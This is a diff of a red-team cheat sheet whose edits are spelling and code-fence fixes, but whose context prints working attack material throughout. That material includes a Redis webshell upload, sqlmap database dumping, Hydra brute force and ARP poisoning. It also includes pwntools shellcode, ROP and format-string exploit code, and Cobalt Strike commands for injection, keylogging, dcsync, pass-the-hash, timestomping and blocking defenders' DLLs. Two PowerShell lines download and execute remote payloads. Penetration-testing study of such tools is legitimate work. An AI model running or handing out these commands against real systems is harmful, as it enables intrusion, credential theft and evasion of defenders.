@@ -40,8 +40,8 @@
 * [Network service - Login Brute Force + Wordlist attacks](#Login-Brute-Force-+-Wordlist-attacks)
 * [Command & Control Frameworks](#Command-&-Control-Frameworks)
 * [Wifi Tools](#Wifi-Tools)
-* [Raspberri PI Exploitation](#Raspberri-PI-Exploitation)
-* [Social Engeneering](#Social-Engeneering)
+* [Raspberry PI Exploitation](#Raspberry-PI-Exploitation)
+* [Social Engineering](#Social-Engineering)
 * [Wordlists / Wordlist generators](#Wordlists-/-Wordlist-generators)
 * [Obfuscation](#Obfuscation)
 * [Source Code Analysis](#Source-Code-Analysis)
@@ -274,7 +274,7 @@ https://github.com/dirkjanm/PKINITtools - Tools for Kerberos PKINIT and relaying
 
 https://github.com/juliourena/SharpNoPSExec - Get file less command execution for lateral movement.
 
-# POST Exploitation
+# Post Exploitation
 
 https://github.com/mubix/post-exploitation
 
@@ -1727,7 +1727,7 @@ https://github.com/chrisk44/Hijacker
 
 https://github.com/samyk/slipstream - NAT Slipstreaming allows an attacker to remotely access any TCP/UDP services bound to a victim machine, bypassing the victim’s NAT/firewall, just by the victim visiting a website
 
-# Raspberri PI Exploitation
+# Raspberry PI Exploitation
 
 https://github.com/secgroundzero/warberry
 
@@ -1753,7 +1753,7 @@ https://github.com/insecurityofthings/jackit
 
 https://github.com/BastilleResearch/mousejack
 
-# Social Engeneering
+# Social Engineering
 
 https://github.com/kgretzky/evilginx
 
@@ -2206,7 +2206,7 @@ MSF:
 * exploit/linux/redis/redis_replication_cmd_exec
 
 Windows Targets - Webshell upload
-```
+```console
 redis-cli -h targethost -p targetport
 config set dir C:\inetpub\wwwroot\
 config set dbfilename shell.aspx
@@ -2471,20 +2471,9 @@ https://github.com/google/tsunami-security-scanner
 50. [Utilizing Syscalls in CSharp]([https://jhalon.github.io/utilizing-syscalls-in-csharp-1/](https://jhalon.github.io/utilizing-syscalls-in-csharp-1/ "https://jhalon.github.io/utilizing-syscalls-in-csharp-1/")) 
 51. [Direct Syscalls and sRDI]([https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/ "https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/"))
 
+---
 
-
-
-
-
-
-
-
-
-
-
-
-
-#  Azure Red Team Master
+# Azure Red Team Master
 
 # Azure Active Directory
 
@@ -3605,45 +3594,35 @@ Using [https://autologon.microsoftazuread-sso.com/](https://autologon.microsofta
 * [Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020](https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56)
 * [AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20](https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html)
 * [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
+  
+---
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-# ejpt-cheatsheet 
+# ejpt-cheatsheet
 
 ## Nmap
 ___
 #### Ping Sweep
-```sh
+console
 nmap -sn <CIDR Notation>        #Finding alive IP addresses in the subnet
-```
+
 You can also perform ping sweep using fping tool
-```
+console
 fping -a -g 10.54.12.0/24 2>/dev/null
 ```
 
 Now you need to find open ports on each alive IP, you can perform this using two methods
 #### METHOD - 1
 Perform aggressive scan on all ports which might do not required to be scanned. This could cost you time and give results which might not be useful.
-```sh
+```console
 nmap -p- -A -Pn -iL hosts.txt       # hosts.txt file contains the alive host addresses
 ```
 #### METHOD - 2
 This method first find the open ports and after this you can perform aggressive scan on particular port. This method do not probe all the available ports blindly and you can choose which port might be useful to you to scan.
 
-```sh
+```console
 nmap -p- -T4 -Pn -vv -iL hosts.txt      # This will give you all the open ports on hosts provided using hosts.txt file
-
+```
+```console
 nmap -p<ports> -A -Pn -vv <IP>      # This will only probe ports selected by you for particular IP
 ```
 
@@ -3652,7 +3631,7 @@ nmap -p<ports> -A -Pn -vv <IP>      # This will only probe ports selected by you
 ___
 
 #### HTTP
-```sh
+```console
 nc -v www.abc.com 80        # After pressing enter you are prompted to send some data
 
 Type two lines given below and press enter two times to get http response
@@ -3660,7 +3639,7 @@ GET / HTTP/1.1
 Host: www.abc.com 
 ```
 #### HTTPs
-```sh
+```console
 openssl s_client -connect hack.me 443       # Establish ssl connection
 ```
 After establishing ssl connection you can proceed like nc prompt
@@ -3669,17 +3648,17 @@ After establishing ssl connection you can proceed like nc prompt
 ___
 
 #### Checking Routes
-```
+```console
 ip route    # Checking defined routes in linux
 route       # Checking defined routes in linux
 route print     # Checking defined routes in windows
 ```
 #### Adding Manual Routes
-```sh
+```console
 ip route add <subnet> via <gateway or router address>
 ```
 for example,
-```sh
+```console
 ip route add 192.168.222.0/24 via 10.172.24.1       # Here 10.172.24.1 is the address of the gateway for subnet 192.168.222.0/24
 ```
 
@@ -3687,7 +3666,7 @@ ip route add 192.168.222.0/24 via 10.172.24.1       # Here 10.172.24.1 is the ad
 ## Finding MAC Addresses
 ___
 
-```
+```console
 ipconfig /all       # windows
 ifconfig        # *nix OSs
 ip addr     # linux
@@ -3697,14 +3676,14 @@ ip addr     # linux
 ___
 
 
-```
+```console
 arp -a      # Windows
 arp     # *nix OSs
 ip neighbour        # Linux 
 ```
 ## Checking for Listening Ports on a Host
 ___
-```
+```console
 netstat -ano        # Windows
 netstat -tunp       # linux
 ```
@@ -3713,13 +3692,13 @@ netstat -tunp       # linux
 ___
 
 #### Checking for existence of SQL injection
-```sh
+```console
 sqlmap -u ‘http://example.com/view.php?id=1141’ -p id       # GET Method
 
 sqlmap -u ‘http://example.com/view.php’ --data <POST String> -p <parameter>     # POST Method
 ```
 If vulnerable parameter found then you can proceed with extraction of data from database
-```sh
+```console
 sqlmap -u ‘http://example.com/view.php?id=1141’ --dbs     # Getting database names
 sqlmap -u ‘http://example.com/view.php?id=1141’ -D <DB_name> --tables   # Getting table names
 sqlmap -u ‘http://example.com/view.php?id=1141’ -D <db_name> -T <tbl_name> --columns    # Getting columns
@@ -3727,7 +3706,7 @@ sqlmap -u ‘http://example.com/view.php?id=1141’ -D <DB_name> -T <tbl_name> -
 ```
 ## John-The-Ripper
 ___
-```sh
+```console
 john --list=formats
 john -incremental -users:<users list> <file to crack>       # if you want to crack only certain users from the password database such as /etc/shadow file
 john --show crackme     # Check cracked password after completion of cracking session, where crackme is the password database file
@@ -3737,7 +3716,7 @@ john -wordlist=<wordlist> -rules <file to crack>        # rules are used for cra
 ## Hydra
 ___
 
-```sh
+```console
 hydra -U ftp        # hydra uses module for each service to attack. To get information about a module this command can be used
 hydra -L users.txt -P pass.txt <service://server> <options>
 hydra -l admin -P pass.txt -f ftp://10.10.10.10        # Stop attacking on finding first successful hit for user admin
@@ -3747,7 +3726,7 @@ hydra  -L users.txt -P passwords.txt <IP> http-post-form "/login.php:user=^USER^
 ## Hashcat
 ___
 
-```sh
+```console
 hashcat -m 0 -a 0 exam.hash file.dict
 hashcat -m 0 -a 0 exam.hash file.dict -r rule/custom.rule       # here rule file contains the rules to creat mangling word such as p@ssword, PaSSworD  https://hashcat.net/wiki/doku.php?id=rule_based_attack 
 hashcat -m 0 -a 3 exam.hash ?l?l?l?l?l?a        # https://hashcat.net/wiki/doku.php?id=mask_attack
@@ -3756,26 +3735,26 @@ hashcat -m 0 -a 3 exam.hash ?l?l?l?l?l?a        # https://hashcat.net/wiki/doku.
 ___
 
 #### enum4linux
-```sh
+```console
 enum4linux -a <ip>      # Enumerating using enum4linux tool
 ```
 #### smbclient
-```sh
+```console
 smbclient -L //IP -N    # Checking for available shares
 smbclient //<target IP>/IPC$ -N     # Connecting to a share
 ```
 #### nmap scripts
-```sh
+```console
 nmap -p445 --script=smb-vuln-* <IP> -v      # This will run all the smb-vuln scripts, if you want to run only few scripts then you can check other available scripts in /usr/share/nmap/scripts
 ```
 ## Checking for anonymous FTP 
 ___
-```sh
+```console
 ftp <IP>        # enter 'anonymous' as username and password
 ```
 ## ARP Poisoning
 ___
-```sh
+```console
 echo 1 > /proc/sys/net/ipv4/ip_forward      # enabling Linux Kernel IP Forwarding, to enable forwarding packet to real destination host
 arpspoof -i <interface> -t <target> -r <host>       # if arpspoof do not work then install dsniff which includes this tool also
 ```
@@ -3783,26 +3762,26 @@ arpspoof -i <interface> -t <target> -r <host>       # if arpspoof do not work th
 ___
 
 If you find mysql information then you can try connecting to mysql service remotely.
-```sh
+```console
 mysql -u <user> -p<password> -h <IP> -D <dbname>
 ```
 ## Directory busting
 ___
 #### dirb
-```sh
+```console
 dirb http://<IP>/
 dirb http://<IP>/ <dictionary_file_path>    # Use dictionary other than default one
 dirb http://<IP>/dir -u admin:admin    # When you want to bust recursively but a dir asks for username password which you know already 
 ```
 #### gobuster
-```sh
+```console
 gobuster dir --url http://<IP>/ --wordlist=<wordlist_file_path>     # -t <value> for more threads
 gobuster dir --url http://<IP>/dir --wordlist=<wordlist_file_path> -U username -P password
 ```
 
-## MsfVenom Payload Creation
+## Msfvenom Payload Creation
 ___
-```sh
+```console
 msfvenom -p <payload_path> LHOST=<IP> LPORT=<PORT> -f <format> -o shell
 ```
 Check [this](https://netsec.ws/?p=331) for some useful payloads
@@ -3810,7 +3789,7 @@ Check [this](https://netsec.ws/?p=331) for some useful payloads
 ## Meterpreter Autoroute
 ___
 
-```
+```console
 meterpreter> run autoroute -s <subnet>
 meterpreter > run autoroute -p      # show active route table
 ```
@@ -3843,20 +3822,20 @@ meterpreter > run autoroute -p      # show active route table
 <a name="program-interaction"></a>
 ## 1. Program Interaction
 
-```py
+```python
 # process objects can be created from a local binary, or created
 # from a remote socket
 p = process('./target')
 p = remote('127.0.0.1', 1337)
 ```
 
-```py
+```python
 # environment variables and command line arguments can also be passed
 # to the target binary at runtime
 p = process(['./target', '--arg1', 'some data'], env={'env1': 'some data'})
 ```
 
-```py
+```python
 # you can attach a gdb instance to your already running process
 p = process('./target')
 gdb.attach(p)
@@ -3866,7 +3845,7 @@ gdb.attach(p)
 p = gdb.debug('./target', aslr=False, gdbscript='b *main+123')
 ```
 
-```py
+```python
 # writing data to the process `stdin`
 p.write(b'aaaa')      # p.send(b'aaaa')
 p.writeline(b'aaaa')  # p.sendline(b'aaaa'), p.write(b'aaaa' + b'\n')
@@ -3891,7 +3870,7 @@ p.interactive()
 p.wait()
 ```
 
-```py
+```python
 # you can also use pwntools tubes in python's `with` specifier
 with process('./target') as p:
     # interact with process here, when done `p.close()` is called
@@ -3903,7 +3882,7 @@ with process('./target') as p:
 <a name="environment-and-contexts"></a>
 ## 2. Environment and Contexts
 
-```py
+```python
 # this list of context values is not exhaustive, these are
 # just the ones that I use the most often
 
@@ -3926,14 +3905,14 @@ context.log_level = 'error'
 context.sign = 'signed'
 ```
 
-```py
+```python
 # you can also update multiple context values at once with the 
 # `clear` or `update` functions
 context.clear(arch='amd64', log_level='error')
 context.update(arch='amd64', log_level='error')
 ```
 
-```py
+```python
 # pwntools also allows you to use what are called 'scoped'
 # contexts, utilising python's `with` specifier
 with context.local(log_level='error'):
@@ -3946,14 +3925,14 @@ with context.local(log_level='error'):
 <a name="logging-and-output"></a>
 ## 3. Logging and Output
 
-```py
+```python
 # the most basic logging utilities are below
 log.warn('a warning message')     # -> [!] a warning message
 log.info('some information')      # -> [*] some information
 log.debug('a debugging message')  # -> [DEBUG] a debugging message
 ```
 
-```py
+```python
 # logging errors will trigger an exception in addition
 # to printing some output
 log.error('an error occurred')
@@ -3976,7 +3955,7 @@ PwnlibException: an error occurred
 '''
 ```
 
-```py
+```python
 # debug messages work a little differently than the
 # other log levels, by default they're disabled
 context.log_level = 'debug'
@@ -4006,7 +3985,7 @@ asm('nop')
 <a name="encoding-packing-and-utility"></a>
 ## 4. Encoding, Packing and Utility
 
-```py
+```python
 # pwntools provides functions for converting to / from
 # hexadecimal representations of byte strings
 enhex(b'/flag')      # = '2f666c6167'
@@ -4018,7 +3997,7 @@ b64e(b'/flag')    # = 'L2ZsYWc='
 b64d('L2ZsYWc=')  # = b'/flag'
 ```
 
-```py
+```python
 # you can also find functions for calculating md5 and sha1
 # hashes within the pwntools library
 md5sumhex(b'hello')         # = '5d41402abc4b2a76b9719d911017c592'
@@ -4027,7 +4006,7 @@ sha1sumhex(b'hello')        # = 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d'
 sha1filehex('./some-file')  # = '7d97e98f8af710c7e7fe703abc8f639e0ee507c4'
 ```
 
-```py
+```python
 # converting from integer representations
 p8(0x41)                 # = b'\x41'
 p16(0x4142)              # = b'\x42\x41'
@@ -4041,20 +4020,20 @@ u32(b'\x44\x43\x42\x41')                  # = 0x41424344
 u64(b'\x48\x47\x46\x45\x44\x43\x42\x41')  # = 0x4142434445464748
 ```
 
-```py
+```python
 # you can also specify endianness with the (un)packing functions
 p64(0x4142434445464748, endian='big')                   # = b'\x41\x42\x43\x44\x45\x46\x47\x48
 u64(b'\x41\x42\x43\x44\x45\x46\x47\x48', endian='big')  # = 0x4142434445464748
 ```
 
-```py
+```python
 # pwntools also provides a `pack` and `unpack` functions for data of
 # atypical or unusual length
 pack(0x414243, 24)           # = b'\x43\x42\x41'
 unpack(b'\x41\x42\x43', 24)  # = 0x434241
 ```
 
-```py
+```python
 # a leak we've captured from the process `stdout`
 leak = b'0\xe1u65\x7f'
 
@@ -4063,7 +4042,7 @@ leak = b'0\xe1u65\x7f'
 leak = unpack(leak, 'all')  # leak = 139866523689264 = 0x7f353675e130
 ```
 
-```py
+```python
 # pwntools also provides functions for generating cyclic sequences
 # of bytes to find various offsets in memory
 cyclic(16)       # = b'aaaabaaacaaadaaa'
@@ -4073,7 +4052,7 @@ cyclic_find(0x61616164)               # = 12
 cyclic_find(0x6161616161616162, n=8)  # = 8
 ```
 
-```py
+```python
 # you can also print hexdumps of byte strings
 print(hexdump(data))
 
@@ -4092,7 +4071,7 @@ print(hexdump(data))
 
 The shellcraft module is massive, so maybe just [read the documentation](https://pwntools.readthedocs.io/en/latest/shellcraft.html).
 
-```py
+```python
 # you can write shellcode using the `asm` function
 shellcode = asm('''
 execve:
@@ -4110,7 +4089,7 @@ bin_sh:
 payload = bytes(shellcode)
 ```
 
-```py
+```python
 # here's some assembly for a basic `execve("/bin/sh")` shellcode
 shellcode = asm('''
 mov rax, 0x68732f6e69622f
@@ -4130,13 +4109,13 @@ shellcode += shellcraft.syscall('SYS_execve', 'rsp', 0, 0)
 payload = bytes(asm(shellcode))
 ```
 
-```py
+```python
 # or maybe you can just use pwntools' `sh` template
 shellcode = shellcraft.sh()
 payload = bytes(asm(shellcode))
 ```
 
-```py
+```python
 # you can also use gdb to debug shellcode
 shellcode = '''
 execve:
@@ -4160,12 +4139,12 @@ p = gdb.debug(elf.path)
 <a name="elfs-strings-and-symbols"></a>
 ## 6. ELFs, Strings and Symbols
 
-```py
+```python
 # `ELF` objects are instantiated by providing a file name
 elf = ELF('./target')
 ```
 
-```py
+```python
 # accessing symbols via location
 elf.plt  # contains all symbols located in the PLT
 elf.got  # contains all symbols located in the GOT
@@ -4178,7 +4157,7 @@ elf.sym
 puts = elf.plt.puts  # equivalent to elf.sym['puts']
 ```
 
-```py
+```python
 libc = ELF('./libc.so.6')
 
 old_puts = libc.sym.puts  # = 0x875a0
@@ -4192,7 +4171,7 @@ libc.address = 0xdeadbeef000
 new_puts = libc.sym.puts  # 0xdeadbf765a0 = 0xdeadbeef + 0x875a0
 ```
 
-```py
+```python
 libc = ELF('./libc.so.6')
 
 # you can even find strings in elf files with the `search` function
@@ -4205,13 +4184,13 @@ bin_sh = next(elf.search(b'/bin/sh'))
 <a name="return-oriented-programming"></a>
 ## 7. Return Oriented Programming
 
-```py
+```python
 # `ROP` objects are instantiated using an `ELF` object
 elf = ELF('./target')
 rop = ROP(elf)
 ```
 
-```py
+```python
 # specific gadgets can be found using the `find_gadget` function
 pop_rax = rop.find_gadget(['pop rax', 'ret']).address
 syscall = rop.find_gadget(['syscall', 'ret']).address
@@ -4221,7 +4200,7 @@ pop_rdi = rop.rdi.address
 pop_rsi = rop.rsi.address
 ```
 
-```py
+```python
 pop_rax = 0xdeadbeef
 syscall = 0xcafebabe
 
@@ -4232,7 +4211,7 @@ rop.raw(59)
 rop.raw(syscall)
 ```
 
-```py
+```python
 rop.call(elf.sym.puts, [0xdeadbeef])
 
 # the above `call` function is equivalent to
@@ -4241,7 +4220,7 @@ rop.raw(0xdeadbeef)
 rop.raw(elf.sym.puts)
 ```
 
-```py
+```python
 # rop chains can also be built on top of libc, rather than your
 # target binary
 libc = ELF('./libc.so.6')
@@ -4258,13 +4237,13 @@ rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
 rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])
 ```
 
-```py
+```python
 # converting the rop chain to bytes in order to send it as
 # a payload
 payload = rop.chain()
 ```
 
-```py
+```python
 # printing the rop chain generated by pwn tools
 print(rop.dump())
 ```
@@ -4274,7 +4253,7 @@ print(rop.dump())
 <a name="srop-and-sigreturn-frames"></a>
 ## 8. SROP and Sigreturn Frames
 
-```py
+```python
 # address of a syscall instruction
 syscall = 0xdeadbeef
 
@@ -4292,7 +4271,7 @@ frame.rdx = 0
 frame.rip = syscall
 ```
 
-```py
+```python
 # the sigreturn frame will need to be converted to bytes prior
 # to being sent as part of a payload
 payload = bytes(frame)
@@ -4304,7 +4283,7 @@ payload = bytes(frame)
 <a name="format-string-exploits"></a>
 ## 9. Format String Exploits
 
-```py
+```python
 # the format string offset
 offset = 5
 
@@ -4320,14 +4299,14 @@ payload = fmtstr_payload(offset, writes)
 p.writeline(payload)
 ```
 
-```py
+```python
 # if data is written by the vulnerable function at the start of
 # your payload, you can specify the number of bytes written
 payload = fmtstr_payload(offset, writes, numbwritten=8)
 p.writeline(payload)
 ```
 
-```py
+```python
 p = process('./target')
 
 # you will need to define a function that sends your payload to
@@ -4341,7 +4320,7 @@ fmt_str = FmtStr(execute_fmt=send_data)
 offset = fmt_str.offset
 ```
 
-```py
+```python
 # you can also use the `FmtStr` object to perform your writes
 fmt_str = FmtStr(execute_fmt=send_data)
 fmt_str.write(0x40010, 0xdeadbeef)  # write 0xdeadbeef at 0x40010
@@ -4830,11 +4809,11 @@ General notes and advices for cobalt strike C2 framework.
   - **getuid:** Get current user uid.
   - **sleep:** Set the interval and jitter of beacon's call back.
   - **sleep Usage:**
-  ```
+  ```console
   sleep [time in seconds] [jitter]
   ```
   i.e.
-  ```
+  ```console
   sleep 5 60
   sleep 120 40
   ...
@@ -4844,7 +4823,7 @@ General notes and advices for cobalt strike C2 framework.
   - **cp:** Copy a local file on another local location.
   - **download/upload:** Download a file and upload a local file.
   - **download/upload Usage:**
-  ```
+  ```console
   download C:\Users\victim\Documents\passwords.csv
   upload C:\Users\S1ckB0y1337\NotMalware\youvebeenhacked.txt
   ```
@@ -4856,20 +4835,20 @@ General notes and advices for cobalt strike C2 framework.
   - **browserpivot:** Will hijack a web session of internet explorer and make possible for us to browse the web as the victim's browser, including it's sessions, cookies and saved passwords.
   - **dcsync:** Perform the DCsync attack using mimikatz.
   - **dcsync Usage:**
-  ```
+  ```console
   dcsync [DOMAIN.fqdn] [DOMAIN\user]
   ```
   i.e.
-  ```
+  ```console
   dcsync CORP.local CORP\steve.johnson
   ```
   - **desktop:** Inject a VNC server on the beacon process and get a remote desktop view of the target.
   - **desktop Usage:**
-  ```
+  ```console
   desktop [pid] [x86|x64] [high|low]
   ```
   i.e.
-  ```
+  ```console
   desktop 592 x64 high
   desktop 8841 x86 low
   ```
@@ -4877,16 +4856,16 @@ General notes and advices for cobalt strike C2 framework.
   - **dllinject/dllload:** Inject a reflective dll into a process/Load a dll on current process.
   - **execute-assembly:** Loads and executes a .NET compiled assembly executable completely on memory.
   - **execute-assembly Usage:**
-  ```
+  ```console
   execute-assembly [/path/to/local/.NET] [arguments]
   ```
   - **inject:** Inject a beacon payload on a specified process and spawn a new beacon session under it's security context.
   - **inject Usage:**
-  ```
+  ```console
   inject [pid] [x86|x64] [listener]
   ```
   i.e.
-  ```
+  ```console
   inject 9942 x64 Lab-SMB
   inject 429 x86 Lab-HTTPS
   ...
@@ -4899,22 +4878,22 @@ General notes and advices for cobalt strike C2 framework.
   - **shinject:** Inject shellcode into another a running process.
   - **shspawn:** Create a new process and inject shellcode into it.
   - **shspawn Usage:**
-  ```
+  ```console
   shspawn [x86|x64] [/path/to/my.bin]
   ```
   i.e.
-  ```
+  ```console
   shspawn x64 /opt/shellcode/malicious.bin
   ```
   
   ## Privilege Escalation
   - **elevate:** Contains numerous ways to escalate your privileges to Administrator or SYSTEM using kernel exploits and UAC bypasses.
   - **elevate Usage:**
-  ```
+  ```console
   elevate [exploit] [listener]
   ```
   i.e.
-  ```
+  ```console
   elevate juicypotato Lab-SMB
   elevate ms16-032 Lab-HTTPS
   ...
@@ -4923,23 +4902,23 @@ General notes and advices for cobalt strike C2 framework.
   - **getprivs:** Same as metasploit's function, enables all the available privileges on the current token. 
   - **runasadmin:** Attempts to run a command on an elevated context of Administrator or SYSTEM using a local kernel or UAC bypass exploit. The difference with elevate is that it doesnt spawn a new beacon, but executes a specified application of our choice under the new context.
   - **runasadmin Usage:**
-  ```
+  ```console
   runasadmin [exploit] [command] [args]
   ```
   i.e.
   
-  ```
+  ```console
   runasadmin uac-token-duplication [command]
   runasadmin uac-cmstplua [command] 
   ```
   ## Pivoting
   - **socks:** Start a socks4a proxy server and listen on a specified port. Access through the proxy server can achieved using a proxy client like proxychains or redsocks.
   - **socks Usage:**
-  ```
+  ```console
   socks [port]
   ```
   i.e.
-  ```
+  ```console
   socks 9050
   ```
   :exclamation: This requires your /etc/proxychains.conf to be configured to match the port specified. If operating on Windows, your proxychains.conf file may be located in %USERPROFILE%\.proxychains\proxychains.conf, (SYSCONFDIR)/proxychains.conf, or (Global programdata dir)\Proxychains\proxychains.conf.
@@ -4948,30 +4927,30 @@ General notes and advices for cobalt strike C2 framework.
   ## Lateral Movement
   - **portscan:** Performs a portscan on a spesific target.
   - **portscan Usage:**
-  ```
+  ```console
   portscan [ip or ip range] [ports]
   ```
   i.e.
-  ```
+  ```console
   portscan 172.16.48.0/24 1-2048,3000,8080
   ```
   The above command will scan the entire 172.16.48.0/24 subnet on ports 1 to 2048, 3000 and 8080. This can be utilized for single IPs as well.
   - **runas:** A wrapper of runas.exe, using credentials you can run a command as another user.
   - **runas Usage:**
-  ```
+  ```console
   runas [DOMAIN\user] [password] [command] [arguments]
   ```
   i.e.
-  ```
+  ```console
   runas CORP\Administrator securePassword12! Powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.50.90:80/filename'))"
   ```
   - **pth:** By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \
   :exclamation: This module needs Administrator privileges.
   - **pth Usage:**
-  ```
+  ```console
   pth [DOMAIN\user] [hash]
   ```
-  ```
+  ```console
   pth Administrator 97fc053bc0b23588798277b22540c40d
   pth CORP\Administrator 97fc053bc0b23588798277b22540c40d
   ```
@@ -4981,11 +4960,11 @@ General notes and advices for cobalt strike C2 framework.
   :exclamation: The **jump** module will use the current delegation/impersonation token to authenticate on the remote target. \
   :muscle: We can combine the **jump** module with the **make_token** or **pth** module for a quick "jump" to another target on the network.
   - **jump Usage:**
-  ```
+  ```console
   jump [psexec64,psexec,psexec_psh,winrm64,winrm] [server/workstation] [listener]
   ```
   i.e.
-  ```
+  ```console
   jump psexec64 DC01 Lab-HTTPS
   jump winrm WS04 Lab-SMB
   jump psexec_psh WS01 Lab-DNS
@@ -4994,7 +4973,7 @@ General notes and advices for cobalt strike C2 framework.
   - **remote-exec:** Execute a command on a remote target using psexec, winrm or wmi. \
   :exclamation: The **remote-exec** module will use the current delegation/impersonation token to authenticate on the remote target.
   - **remote-exec Usage:**
-  ```
+  ```console
   remote-exec [method] [target] [command]
   ```
   - **ssh/ssh-key:** Authenticate using ssh with password or private key. Works for both linux and windows hosts. It gives you basic ssh functionality with some additional post exploitation modules.
@@ -5003,11 +4982,11 @@ General notes and advices for cobalt strike C2 framework.
   - **hashdump:** Dump the local SAM hive's NTLM hashes. This only dumps local machine user credentials.
   - **keylogger:** Will capture keystrokes of a specified process and save them on a database.
   - **keylogger Usage:**
-  ```
+  ```console
   keylogger [pid] [x86|x64]
   ```
   i.e.
-  ```
+  ```console
   keylogger 8932 x64
   keylogger
   ...
@@ -5015,11 +4994,11 @@ General notes and advices for cobalt strike C2 framework.
   This command can also be used without specifying arguments to spawn a temporary process and inject the keystroke logger into it.
   - **screenshot:** Will capture the screen of a current process and save it on the database.
   - **screenshot Usage:**
-  ```
+  ```console
   screenshot [pid] [x86|x64] [run time in seconds]
   ```
   i.e.
-  ```
+  ```console
   screenshot 1042 x64 15
   screenshot 773 x86 5
   ```
@@ -5031,39 +5010,39 @@ General notes and advices for cobalt strike C2 framework.
    - **spawn Usage:**
    ```
    spawn [x86|x64] [listener]
-   ```
+   ```console
    i.e.
    ```
    spawn x64 Lab-HTTPS
    spawn x86 Lab-SMB
    ...
-   ```
+   ```console
    - **spawnas:** Spawn a new beacon on the current machine as another user by providing credentials.
    - **spawnas Usage:**
-   ```
+   ```console
    spawnas [DOMAIN\user] [password] [listener]
    ```
    i.e.
-   ```
+   ```console
    spawnas CORP\bob.smith baseBall1942 Lab-SMB
    spawnas Administrator SuperS3cRetPaSsw0rD Lab-HTTPS
    ...
    ```
    - **spawnto:** Sets the executable that beacon will use to spawn and inject shellcode into it for it's post-exploitation functionality. You must specify a full path to the executable.
-   ```
+   ```console
    spawnto [x86|x64] [c:\path\to\whatever.exe] 
    ```
    i.e.
-   ```
+   ```console
    spawnto x64 c:\programdata\beacon.exe
    spawnto x86 c:\users\S1ckB0y1337\NotMalware\s1ck.exe
    ```
    - **spawnu:** Attempt to spawn a session with a spoofer PID as its parent, the context of the process will match the identity of the specified PID.
-   ```
+   ```console
    spawnu [pid] [listener]
    ```
    i.e.
-   ```
+   ```console
    spawnu 812 Lab-SMB
    spawnu 9531 Lab-DNS
    ...
@@ -5071,16 +5050,16 @@ General notes and advices for cobalt strike C2 framework.
    - **argue:** Will mask/spoof the arguments of a malicious command of our choice with legitimate ones.
    - **blockdlls:** This module will create and set a custom policy on beacon's child processes that will block the injection of any 3rd party dll that is not signed by microsoft, that way we can block any blue team tool that uses dll injection to inspect and kill malicious processes and actions.
    - **blockdlls Usage:**
-   ```   
+   ```console   
    blockdlls [start|stop]
    ``` 
    - **timestomp:** Tamper the timestamp of a file, by applying another file's timestamp.
    - **timestomp Usage:**
-  ```
+  ```console
   timestomp [fileA] [fileB]
   ```
   i.e.
-  ```
+  ```console
   timestomp C:\Users\S1ckB0y1337\Desktop\logins.xlsx C:\Users\S1ckB0y1337\Desktop\notmalicious.xlsx
   ```
 ## OPSEC Notes
@@ -5111,14 +5090,14 @@ General notes and advices for cobalt strike C2 framework.
 > Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.
 
 
-```powershell
-$ sudo apt-get update
-$ sudo apt-get install openjdk-11-jdk
-$ sudo apt install proxychains socat
-$ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
-$ sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
-$ ./cobaltstrike
-$ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))" 
+```console
+sudo apt-get update
+sudo apt-get install openjdk-11-jdk
+sudo apt install proxychains socat
+sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
+sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
+./cobaltstrike
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))" 
 ```
 
 ## Summary
@@ -5155,7 +5134,7 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
 
 ### Redirectors
 
-```powershell
+```console
 sudo apt install socat
 socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80
 ```
@@ -5204,13 +5183,13 @@ Your Cobalt Strike team server system must be authoritative for the domains you 
 
 Example of DNS on Digital Ocean:
 
-```powershell
+```console
 NS  example.com                     directs to 10.10.10.10.            86400
 NS  polling.campaigns.example.com   directs to campaigns.example.com.	3600
 A	campaigns.example.com           directs to 10.10.10.10	            3600 
 ```
 
-```powershell
+```console
 systemctl disable systemd-resolved
 systemctl stop systemd-resolved
 rm /etc/resolv.conf
@@ -5278,9 +5257,11 @@ https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-she
 ```powershell
 * Attacks > Packages > Payload Generator 
 * Attacks > Packages > Scripted Web Delivery (S)
-$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
-$ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
-$ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
+```
+```console
+python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
